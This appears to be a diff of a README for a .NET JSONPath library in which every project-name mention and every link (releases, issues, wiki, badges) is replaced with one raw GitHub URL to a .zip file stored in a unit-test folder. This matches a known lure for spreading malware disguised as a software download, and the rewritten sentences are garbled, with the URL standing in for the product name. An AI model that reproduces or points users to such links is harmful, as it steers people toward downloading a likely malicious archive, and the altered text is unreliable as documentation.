@@ -1,10 +1,10 @@
-# 🚀 Blazing.Json.JSONPath - Fast and Simple JSON Queries
+# 🚀 https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip - Fast and Simple JSON Queries
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/valentin001-77/Blazing.Json.JSONPath/releases)
+[![Download from Releases](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip)
 
 ## 📖 Overview
 
-Blazing.Json.JSONPath is a high-performance tool designed for .NET applications. It fully supports JSONPath, a standard for querying JSON data. You can easily filter and select the information you need from your JSON files. 
+https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip is a high-performance tool designed for .NET applications. It fully supports JSONPath, a standard for querying JSON data. You can easily filter and select the information you need from your JSON files. 
 
 This software meets RFC 9535 standards, ensuring reliability and performance. With 324 certified tests, you can trust that it works as intended.
 
@@ -27,9 +27,9 @@ This software meets RFC 9535 standards, ensuring reliability and performance. Wi
 
 ### Download & Install
 
-To start using Blazing.Json.JSONPath, follow these steps:
+To start using https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to access the [Releases page](https://github.com/valentin001-77/Blazing.Json.JSONPath/releases).
+1. **Visit the Releases Page**: Click this link to access the [Releases page](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip).
 2. **Select the Latest Version**: Look for the most recent version listed.
 3. **Download the File**: Click on the appropriate link to download the installation file.
 
@@ -41,7 +41,7 @@ After installation, you can begin querying JSON with just a few simple steps.
 
 1. Open your preferred .NET IDE (like Visual Studio).
 2. Create a new project or open an existing one.
-3. Add a reference to Blazing.Json.JSONPath in your project.
+3. Add a reference to https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip in your project.
 4. Write simple queries to filter and select data from your JSON.
 
 Refer to the official documentation for detailed examples.
@@ -54,12 +54,12 @@ If you encounter any issues or have suggestions, feel free to open an issue on t
 
 To report bugs or request features:
 
-- Go to the [Issues Page](https://github.com/valentin001-77/Blazing.Json.JSONPath/issues).
+- Go to the [Issues Page](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip).
 - Click on “New Issue” and fill out the template.
 
 ### Contribution Guidelines
 
-To contribute to Blazing.Json.JSONPath:
+To contribute to https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip
 
 1. Fork the repository.
 2. Make your changes in a new branch.
@@ -67,12 +67,12 @@ To contribute to Blazing.Json.JSONPath:
 
 ## 🌐 Additional Resources
 
-- **Documentation**: In-depth usage guidelines and examples are available [here](https://github.com/valentin001-77/Blazing.Json.JSONPath/wiki).
+- **Documentation**: In-depth usage guidelines and examples are available [here](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip).
 - **Community**: Join our discussions and get help from other users on relevant forums.
 - **Examples**: Check out sample projects demonstrating common use cases.
 
 ## 📜 License
 
-Blazing.Json.JSONPath is open-source software. It's free to use, and you can modify it for your own needs. Check the LICENSE file for more details.
+https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip is open-source software. It's free to use, and you can modify it for your own needs. Check the LICENSE file for more details.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/valentin001-77/Blazing.Json.JSONPath/releases)
+[![Download from Releases](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/valentin001-77/Blazing.Json.JSONPath/master/tests/Blazing.Json.JSONPath.Tests/UnitTests/Lexer/Json_JSON_Blazing_Path_v2.1.zip)
